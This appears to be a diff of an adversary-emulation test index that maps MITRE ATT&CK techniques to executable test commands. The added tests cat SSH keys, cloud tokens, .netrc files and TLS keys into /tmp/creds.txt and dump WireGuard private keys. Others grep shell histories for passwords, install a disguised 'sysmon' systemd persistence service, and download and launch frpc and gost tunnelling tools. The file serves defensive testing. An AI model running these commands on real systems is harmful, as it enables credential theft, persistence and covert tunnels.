         Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.
 
@@ -23942,7 +24007,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.722Z'
-      name: Malicious Copy and Paste
+      name: 'User Execution: Malicious Copy and Paste'
       description: "An adversary may rely upon a user copying and pasting code in
         order to gain execution. Users may be subjected to social engineering to get
         them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).
@@ -25224,7 +25289,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:25.363Z'
-      name: Kubernetes Cronjob
+      name: 'Scheduled Task/Job: Container Orchestration Job'
       description: |-
         Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.
 
@@ -25461,7 +25526,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:31.226Z'
-      name: Active Setup
+      name: 'Boot or Logon Autostart Execution: Active Setup'
       description: |-
         Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.
 
@@ -26525,7 +26590,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:39.525Z'
-      name: Browser Extensions
+      name: Software Extensions
       description: "Adversaries may abuse software extensions to establish persistent
         access to victim systems. Software extensions are modular components that
         enhance or customize the functionality of software applications, including
@@ -26887,7 +26952,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:42.963Z'
-      name: 'Boot or Logon Initialization Scripts: Logon Script (Mac)'
+      name: 'Boot or Logon Initialization Scripts: Login Hook'
       description: "Adversaries may use a Login Hook to establish persistence executed
         upon user logon. A login hook is a plist file that points to a specific script
         to execute with root privileges upon user logon. The plist file is located
@@ -27538,7 +27603,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:51.278Z'
-      name: Time Providers
+      name: 'Boot or Logon Autostart Execution: Time Providers'
       description: |-
         Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)
 
@@ -28049,7 +28114,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.640Z'
-      name: SSH Authorized Keys
+      name: 'Account Manipulation: SSH Authorized Keys'
       description: "Adversaries may modify the SSH <code>authorized_keys</code> file
         to maintain persistence on a victim host. Linux distributions, macOS, and
         ESXi hypervisors commonly use key-based authentication to secure the authentication
@@ -28500,7 +28565,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.643Z'
-      name: 'Office Application Startup: Office Template Macros.'
+      name: 'Office Application Startup: Office Template Macros'
       description: "Adversaries may abuse Microsoft Office templates to obtain persistence
         on a compromised system. Microsoft Office contains templates that are part
         of common Office applications and are used to customize styles. The base templates
@@ -30303,7 +30368,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:15.437Z'
-      name: IIS Components
+      name: 'Server Software Component: IIS Components'
       description: |-
         Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)
 
@@ -30464,7 +30529,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.709Z'
-      name: 'Event Triggered Execution: .bash_profile .bashrc and .shrc'
+      name: 'Event Triggered Execution: Unix Shell Configuration Modification'
       description: "Adversaries may establish persistence through executing malicious
         commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s
         execute several configuration scripts at different points throughout the session
@@ -30701,7 +30766,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:17.208Z'
-      name: Authentication Package
+      name: 'Boot or Logon Autostart Execution: Authentication Package'
       description: |-
         Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)
 
@@ -31866,7 +31931,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:28.955Z'
-      name: 'Boot or Logon Initialization Scripts: Rc.common'
+      name: 'Boot or Logon Initialization Scripts: RC Scripts'
       description: |-
         Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.
 
@@ -31986,7 +32051,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.722Z'
-      name: 'Create or Modify System Process: SysV/Systemd Service'
+      name: 'Create or Modify System Process: Systemd Service'
       description: "Adversaries may create or modify systemd services to repeatedly
         execute malicious payloads as part of persistence. Systemd is a system and
         service manager commonly used for managing background daemon processes (also
@@ -32195,6 +32260,68 @@ persistence:
           systemctl disable T1543.002
           rm -rf /etc/init.d/T1543.002
           systemctl daemon-reload
+    - name: TeamPCP Aqua Trivy Persistence
+      auto_generated_guid: a29738b0-0e14-488c-984f-6a851fcdbcfe
+      description: |
+        Simulates the persistence mechanism used by TeamPCP malware distributed via a hijacked
+        Aqua Trivy binary. Installs a user-level systemd service (sysmon) that drops a
+        Python script to ~/.config/systemd/user/sysmon.py. The script writes a second-stage
+        payload to #{pglog_path} and executes it in a new session. In the wild, the dropper polls
+        an ICP-hosted C2 canister for a download URL; this test creates the payload unconditionally
+        to avoid external network contact. Filepaths and names match observed IOCs.
+
+        Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
+      supported_platforms:
+      - linux
+      input_arguments:
+        pglog_path:
+          description: Path where the dropper writes and executes the second-stage
+            payload
+          type: path
+          default: "/tmp/pglog"
+        sysmon_script_path:
+          description: Path to the sysmon Python script copied into the user systemd
+            directory
+          type: path
+          default: "$PathToAtomicsFolder/T1543.002/src/sysmon.py"
+      dependencies:
+      - description: python3 must be installed
+        prereq_command: 'which python3 > /dev/null 2>&1
+
+          '
+        get_prereq_command: 'apt-get install -y python3 2>/dev/null || yum install
+          -y python3 2>/dev/null
+
+          '
+      dependency_executor_name: bash
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          mkdir -p $HOME/.config/systemd/user
+          cp "#{sysmon_script_path}" "$HOME/.config/systemd/user/sysmon.py"
+          echo "[Unit]" > $HOME/.config/systemd/user/sysmon.service
+          echo "Description=System Monitor Service" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Service]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Type=simple" >> $HOME/.config/systemd/user/sysmon.service
+          echo "ExecStart=/usr/bin/python3 $HOME/.config/systemd/user/sysmon.py \"#{pglog_path}\"" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Restart=always" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Install]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "WantedBy=default.target" >> $HOME/.config/systemd/user/sysmon.service
+          systemctl --user daemon-reload
+          systemctl --user enable sysmon.service
+          systemctl --user start sysmon.service
+          loginctl enable-linger $USER
+        cleanup_command: |
+          systemctl --user stop sysmon.service
+          systemctl --user disable sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.py
+          rm -f #{pglog_path}
+          systemctl --user daemon-reload
+          loginctl disable-linger $USER
   T1668:
     technique:
       type: attack-pattern
@@ -32577,6 +32704,7 @@ persistence:
       - macOS
       - Network Devices
       x_mitre_version: '1.1'
+      identifier: T1653
     atomic_tests: []
   T1037.001:
     technique:
@@ -34011,7 +34139,7 @@ command-and-control:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.628Z'
-      name: Remote Access Software
+      name: Remote Access Tools
       description: |-
         An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.
 
@@ -34466,6 +34594,101 @@ command-and-control:
           pkill -9 $(basename "#{binary_path}")
           rm -f "#{binary_path}"
         name: sh
+    - name: Install and Run frpc Reverse Proxy Client
+      auto_generated_guid: f54179ee-c782-4fe3-b836-213d3bda66a2
+      description: |
+        Downloads and runs frpc (fast reverse proxy client), the victim-side component
+        of the frp framework. Adversaries deploy frpc on compromised hosts to establish
+        outbound tunnel connections to an attacker-controlled frps server, bypassing
+        inbound firewall rules and exposing internal services externally.
+      supported_platforms:
+      - linux
+      input_arguments:
+        remote_url:
+          description: URL to download the frp release archive
+          type: url
+          default: https://github.com/fatedier/frp/releases/download/v0.71.0/frp_0.71.0_linux_amd64.tar.gz
+        frp_path:
+          description: Path to extract the frp archive
+          type: path
+          default: PathToAtomicsFolder/../ExternalPayloads/frp
+        server_addr:
+          description: Address of the frps server to connect to
+          type: string
+          default: 127.0.0.1
+        server_port:
+          description: Port of the frps server to connect to
+          type: integer
+          default: 7000
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'frpc binary must exist at #{frp_path}/frpc
+
+          '
+        prereq_command: 'test -f #{frp_path}/frpc
+
+          '
+        get_prereq_command: |
+          mkdir -p #{frp_path}
+          curl -L "#{remote_url}" -o "#{frp_path}/frp.tar.gz"
+          tar -xzf "#{frp_path}/frp.tar.gz" --strip-components 1 -C "#{frp_path}"
+          rm -f "#{frp_path}/frp.tar.gz"
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          sed -i "s/^serverAddr = .*/serverAddr = \"#{server_addr}\"/" #{frp_path}/frpc.toml
+          sed -i "s/^serverPort = .*/serverPort = #{server_port}/" #{frp_path}/frpc.toml
+          nohup #{frp_path}/frpc -c #{frp_path}/frpc.toml >/dev/null 2>&1 &
+        cleanup_command: |
+          pkill frpc
+          rm -rf #{frp_path}
+    - name: Install and Run gost Tunnel Proxy
+      auto_generated_guid: 3afc90c4-90b3-44af-8d14-52852abe7258
+      description: |
+        Downloads and runs gost (Go Simple Tunnel), a multi-protocol proxy and tunnel
+        tool used by adversaries to establish SOCKS5 proxies, protocol relays, and
+        encrypted tunnels on compromised hosts to facilitate C2 communication and
+        lateral movement while evading network controls.
+      supported_platforms:
+      - linux
+      input_arguments:
+        remote_url:
+          description: URL to download the gost release archive
+          type: url
+          default: https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz
+        gost_path:
+          description: Path to store the gost binary
+          type: path
+          default: PathToAtomicsFolder/../ExternalPayloads/gost
+        listen_port:
+          description: Local port for the SOCKS5 proxy listener
+          type: integer
+          default: 1080
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'gost binary must exist at #{gost_path}/gost
+
+          '
+        prereq_command: 'test -f #{gost_path}/gost
+
+          '
+        get_prereq_command: |
+          mkdir -p #{gost_path}
+          curl -L "#{remote_url}" -o "#{gost_path}/gost.tar.gz"
+          tar -xzf "#{gost_path}/gost.tar.gz" -C "#{gost_path}"
+          rm -f "#{gost_path}/gost.tar.gz"
+          chmod +x #{gost_path}/gost
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'nohup #{gost_path}/gost -L socks5://:#{listen_port} >/dev/null 2>&1
+          &
+
+          '
+        cleanup_command: |
+          pkill gost
+          rm -rf #{gost_path}
   T1071.003:
     technique:
       type: attack-pattern
@@ -36403,7 +36626,7 @@ command-and-control:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:35.060Z'
-      name: Data Obfuscation via Steganography
+      name: 'Data Obfuscation: Steganography'
       description: 'Adversaries may use steganographic techniques to hide command
         and control traffic to make detection efforts more difficult. Steganographic
         techniques can be used to hide data in digital messages that are transferred
@@ -38076,7 +38299,7 @@ collection:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.624Z'
-      name: Data from Cloud Storage Object
+      name: Data from Cloud Storage
       description: "Adversaries may access data from cloud storage.\n\nMany IaaS providers
         offer solutions for online data object storage such as Amazon S3, Azure Storage,
         and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office
@@ -38823,7 +39046,7 @@ collection:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.636Z'
-      name: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
+      name: 'Adversary-in-the-Middle: Name Resolution Poisoning and SMB Relay'
       description: "By responding to LLMNR/NBT-NS/mDNS network traffic, adversaries
         may spoof an authoritative source for name resolution to force communication
         with an adversary controlled system.(Citation: BlackCat ransomware) This activity
@@ -39876,7 +40099,7 @@ lateral-movement:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:19.567Z'
-      name: Remote Services:VNC
+      name: 'Remote Services: VNC'
       description: |-
         Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)
 
@@ -41518,8 +41741,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: 'File and Directory Permissions Modification: FreeBSD, Linux and Mac File
-        and Directory Permissions Modification'
+      name: 'File and Directory Permissions Modification: Linux and Mac Permissions'
       description: "Adversaries may modify file or directory permissions/attributes
         to evade access control lists (ACLs) and access protected files.(Citation:
         Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)
@@ -42367,7 +42589,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.623Z'
-      name: Domain Trust Modification
+      name: 'Domain or Tenant Policy Modification: Trust Modification'
       description: "Adversaries may add new domain trusts, modify the properties of
         existing domain trusts, or otherwise change the configuration of trust relationships
         between domains and tenants to evade defenses and/or elevate privileges.Trust
@@ -42434,7 +42656,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.623Z'
-      name: Windows Host Firewall
+      name: 'Disable or Modify System Firewall: Windows Host Firewall'
       description: "Adversaries may disable or modify the Windows host firewall to
         bypass controls limiting network usage. This can include disabling the Windows
         host firewall entirely, suppressing specific profiles (domain, private, public),
@@ -42460,6 +42682,7 @@ defense-impairment:
       x_mitre_platforms:
       - Windows
       x_mitre_version: '1.0'
+      identifier: T1686.003
     atomic_tests: []
   T1689:
     technique:
@@ -42729,8 +42952,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.625Z'
-      name: 'File and Directory Permissions Modification: Windows File and Directory
-        Permissions Modification'
+      name: 'File and Directory Permissions Modification: Windows Permissions'
       description: |-
         Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).
 
@@ -43594,7 +43816,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.635Z'
-      name: 'Domain Policy Modification: Group Policy Modification'
+      name: 'Domain or Tenant Policy Modification: Group Policy Modification'
       description: "Adversaries may modify Group Policy Objects (GPOs) to subvert
         the intended discretionary access controls for a domain, usually with the
         intention of escalating privileges on the domain. Group policy allows for
@@ -45664,7 +45886,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.717Z'
-      name: Create Cloud Instance
+      name: 'Modify Cloud Compute Infrastructure: Create Cloud Instance'
       description: |-
         An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)
 
@@ -48031,7 +48253,7 @@ credential-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:30.302Z'
-      name: 'Forge Web Credentials: SAML token'
+      name: 'Forge Web Credentials: SAML Tokens'
       description: |-
         An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)
 
@@ -49732,15 +49954,20 @@ credential-access:
           description: Path where to start searching from.
           type: path
           default: "/"
-        output_file:
-          description: Output file containing locations of SSH key files
-          type: path
-          default: "/tmp/keyfile_locations.txt"
+        filename:
+          description: SSH Key file to search for
+          type: string
+          default: id_rsa
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
         command: |
-          find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
+          find #{search_path} -name "#{filename}" -type f #{optional_flags} 2>/dev/null
           exit 0
-        cleanup_command: 'rm #{output_file}
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -49929,6 +50156,91 @@ credential-access:
 
           '
         name: sh
+    - name: Enumerate WireGuard interface credentials with wg showconf
+      auto_generated_guid: e7568442-1b7d-4380-a933-b269d1326b6c
+      description: 'Dump WireGuard interface configurations including private keys
+        and preshared keys using wg showconf. Requires root privileges.
+
+        '
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'wireguard-tools must be installed
+
+          '
+        prereq_command: 'which wg
+
+          '
+        get_prereq_command: "(apt-get install -y wireguard-tools || dnf install -y
+          wireguard-tools || yum install -y wireguard-tools || pacman -S --noconfirm
+          wireguard-tools) && touch /tmp/wireguard_installed\n"
+      executor:
+        command: 'for iface in $(wg show interfaces); do wg showconf "$iface"; done
+
+          '
+        cleanup_command: 'if [ -f /tmp/wireguard_installed ]; then (apt-get remove
+          -y wireguard-tools || dnf remove -y wireguard-tools || yum remove -y wireguard-tools
+          || pacman -R --noconfirm wireguard-tools) && rm -f /tmp/wireguard_installed;
+          fi
+
+          '
+        name: sh
+        elevation_required: true
+    - name: Find WireGuard configuration files
+      auto_generated_guid: 42c55554-3dcb-4df6-8fbb-c8ccacc478d4
+      description: 'Find WireGuard configuration files in /etc/wireguard/, which contain
+        private keys and preshared keys in plaintext. Requires root privileges.
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find /etc/wireguard -name ''*.conf'' -type f #{optional_flags} 2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+        elevation_required: true
+    - name: Find TLS private key files
+      auto_generated_guid: 5e417277-0ae7-4ad5-a3e8-0fa27c122b29
+      description: |
+        Find TLS private key files on the filesystem by extension.
+        Extensions include *.key, *.pem, *.p12, and *.pfx
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        file_extensions:
+          description: Space-separated TLS key file extensions to search for
+          type: string
+          default: "*.key *.pem *.p12 *.pfx"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'for file_extension in #{file_extensions}; do find #{file_path} -name
+          "$file_extension" -type f #{optional_flags} 2>/dev/null; done
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
   T1557.001:
     technique:
       type: attack-pattern
@@ -49979,7 +50291,7 @@ credential-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.636Z'
-      name: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
+      name: 'Adversary-in-the-Middle: Name Resolution Poisoning and SMB Relay'
       description: "By responding to LLMNR/NBT-NS/mDNS network traffic, adversaries
         may spoof an authoritative source for name resolution to force communication
         with an adversary controlled system.(Citation: BlackCat ransomware) This activity
@@ -50487,7 +50799,7 @@ credential-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:02.375Z'
-      name: 'Unsecured Credentials: Bash History'
+      name: 'Unsecured Credentials: Shell History'
       description: |-
         Adversaries may search the command history on compromised systems for insecurely stored credentials.
 
@@ -50528,7 +50840,7 @@ credential-access:
         output_file:
           description: Path where captured results will be placed
           type: path
-          default: "~/loot.txt"
+          default: "/tmp/loot.txt"
         bash_history_grep_args:
           description: grep arguments that filter out specific commands we want to
             capture
@@ -50541,6 +50853,9 @@ credential-access:
       executor:
         command: 'cat #{bash_history_filename} | grep #{bash_history_grep_args} >
           #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
 
           '
         name: sh
@@ -50567,6 +50882,66 @@ credential-access:
           default: "~/.history"
       executor:
         command: 'cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
+
+          '
+        name: sh
+    - name: Search Through Zsh History
+      auto_generated_guid: 8f2765a8-e795-438b-a102-5e25a7adcce1
+      description: 'Search through zsh history for specific commands we want to capture
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: path
+          default: "/tmp/loot.txt"
+        zsh_history_grep_args:
+          description: grep arguments that filter out specific commands we want to
+            capture
+          type: string
+          default: "-e '-p ' -e 'pass' -e 'ssh'"
+        zsh_history_filename:
+          description: Path of the zsh history file to capture
+          type: path
+          default: "~/.zsh_history"
+      executor:
+        command: 'cat #{zsh_history_filename} | grep #{zsh_history_grep_args} > #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
+
+          '
+        name: sh
+    - name: Search Through SQL History
+      auto_generated_guid: ce64e135-f186-4c4a-85da-75f6ef71e46f
+      description: 'Search through SQL command line history for specific commands
+        we want to capture
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: path
+          default: "/tmp/loot.txt"
+        sql_history_grep_args:
+          description: grep arguments that filter out specific commands we want to
+            capture
+          type: string
+          default: "-e 'pass'"
+        sql_history_filename:
+          description: Path of the sh history file to capture
+          type: path
+          default: "~/.mysql_history"
+      executor:
+        command: 'cat #{sql_history_filename} | grep #{sql_history_grep_args} > #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
 
           '
         name: sh
@@ -50649,8 +51024,12 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Name of the AWS credential file to search for
+          type: string
+          default: credentials
       executor:
-        command: 'find #{file_path}/.aws -name "credentials" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.aws/#{filename}'' -type f 2>/dev/null
 
           '
         name: sh
@@ -50674,8 +51053,8 @@ credential-access:
         name: sh
     - name: Find and Access Github Credentials
       auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
-      description: 'This test looks for .netrc files (which stores github credentials
-        in clear text )and dumps its contents if found.
+      description: 'Find .netrc files, which store GitHub credentials in clear text,
+        and dump their contents if found.
 
         '
       supported_platforms:
@@ -50685,14 +51064,25 @@ credential-access:
         file_path:
           description: Path to search
           type: string
-          default: "/home"
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".netrc"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        name: bash
-        elevation_required: false
-        command: 'for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do
-          echo $file ; cat $file ; done
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
 
           '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
     - name: Find Azure credentials
       auto_generated_guid: a8f6148d-478a-4f43-bc62-5efee9f931a4
       description: 'Find local Azure credentials from file, defaults to using / as
@@ -50707,9 +51097,21 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: msal_token_cache.json
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        command: 'find #{file_path}/.azure -name "msal_token_cache.json" -o -name
-          "accessTokens.json" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.azure/#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -50727,9 +51129,21 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: credentials.db
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        command: 'find #{file_path}/.config/gcloud -name "credentials.db" -o -name
-          "access_tokens.db" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.config/gcloud/#{filename}'' -type f
+          #{optional_flags} 2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -50751,6 +51165,460 @@ credential-access:
         command: 'find #{file_path}/.oci/sessions -name "token" -type f 2>/dev/null
 
           '
+        name: sh
+    - name: Access Travis CI Config File
+      auto_generated_guid: 5312c7c3-775b-4437-a8b0-914b30cfebd4
+      description: 'Find Travis CI configuration files (.travis.yml), which may contain
+        credentials, secrets, or sensitive environment variables.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
